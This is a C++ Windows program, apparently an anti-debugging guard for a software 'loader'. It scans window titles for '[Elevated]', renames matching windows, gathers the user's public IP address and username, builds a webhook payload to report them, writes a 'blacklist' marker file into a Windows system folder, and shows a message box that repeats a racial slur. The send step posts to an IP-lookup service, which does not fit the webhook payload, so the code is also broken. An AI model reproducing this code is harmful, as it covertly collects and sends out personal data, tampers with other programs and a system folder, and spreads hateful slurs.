#include <iostream>
#include <windows.h>
#include <string>
#include <mutex>
#include <thread>
#include <Windows.h>
#include <string>
#include <iostream>
#include <stdio.h>
#include <winhttp.h>
#include <fstream>
#pragma comment(lib, "winhttp.lib")
#define UNLEN 256

std::mutex mtx;
using namespace std;

bool WindowTitleContainsString(HWND hWnd, const std::string& searchString) {
    char windowTitle[256];
    if (GetWindowTextA(hWnd, windowTitle, sizeof(windowTitle))) {
        std::string title(windowTitle);
        if (title.find(searchString) != std::string::npos) {
            return true;
        }
    }
    return false;
}

std::string GetPCUsername() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameA(username, &username_len)) {
        return std::string(username);
    }
    return "**Unavailable**";
}

std::string GetPublicIP() {
    HINTERNET hSession = WinHttpOpen(L"IP Agent/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.ipify.org", INTERNET_DEFAULT_HTTP_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    std::string ip = "**Unavailable**";
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        WinHttpReceiveResponse(hRequest, NULL);
        DWORD dwSize = 0;
        WinHttpQueryDataAvailable(hRequest, &dwSize);

        if (dwSize > 0) {
            char* buffer = new char[dwSize + 1];
            ZeroMemory(buffer, dwSize + 1);
            DWORD dwDownloaded = 0;
            WinHttpReadData(hRequest, (LPVOID)buffer, dwSize, &dwDownloaded);
            ip = std::string(buffer);
            delete[] buffer;
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ip;
}

void ScanWindowForTitle(HWND hWnd, const std::string& searchString) {
    if (WindowTitleContainsString(hWnd, searchString)) {
        char windowTitle[256];
        GetWindowTextA(hWnd, windowTitle, sizeof(windowTitle));
        std::string windowTitleStr(windowTitle);
        SetWindowTextA(hWnd, "Notepad");
        ShowWindow(hWnd, SW_SHOW);

        string ip = GetPublicIP();
        string pcUsername = GetPCUsername();

        HINTERNET hSession = WinHttpOpen(L"IP Agent/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        HINTERNET hConnect = WinHttpConnect(hSession, L"api.ipify.org", INTERNET_DEFAULT_HTTP_PORT, 0);
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

        std::string debugTitle = "debugger detected | detection system";
        std::string desc = "**IP Address: **" + ip + "\\n**PC Username: **" + pcUsername;
        std::string color = "16711680";
        std::string request_body = "{\"username\": \"rahhh\",\"content\": null,\"embeds\": [{\"title\": \"" + debugTitle + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"shitcrack dtc!!!\"},\"color\": " + color + " }], \"attachments\": []}";

        BOOL bResults = WinHttpSendRequest(hRequest,
            L"Content-Type: application/json\r\n",
            (DWORD)-1L,
            (LPVOID)request_body.c_str(),
            (DWORD)request_body.length(),
            (DWORD)request_body.length(),
            0);

        if (bResults) {
            WinHttpReceiveResponse(hRequest, NULL);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        MessageBoxA(NULL, "bye niggerbye niggerbye niggerbye niggerbye niggerbye niggerbye niggerbye niggerbye niggerbye niggerbye niggerbye niggerbye niggerbye niggerbye nigger", "bye nigger", MB_OK);
    }
}

BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
    const std::string& searchString = *reinterpret_cast<std::string*>(lParam);
    ScanWindowForTitle(hWnd, searchString);
    return TRUE;
}

void ScanAllWindows(const std::string& searchString) {
    EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&searchString));
}

void ContinuousWindowScan(const std::string& searchString) {
    while (true) {
        ScanAllWindows(searchString);

        std::string filePath = "C:\\Windows\\Globalization\\Time Zone\\system321.txt";
        std::ofstream file(filePath);
        if (file.is_open()) {
            file.write("Blacklisted", 10);
            file.close();
        }

        WIN32_FIND_DATA findData;
        HANDLE hFind = FindFirstFileA(filePath.c_str(), (LPWIN32_FIND_DATAA)&findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            MessageBoxA(NULL, "You have been blacklisted from our loader.", "Blacklisted", MB_OK);
        }
        FindClose(hFind);

        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}
int main() {
    const std::string searchString = "[Elevated]";

    std::thread scannerThread(ContinuousWindowScan, searchString);

    scannerThread.join();
    scannerThread.detach();
    return 0;
}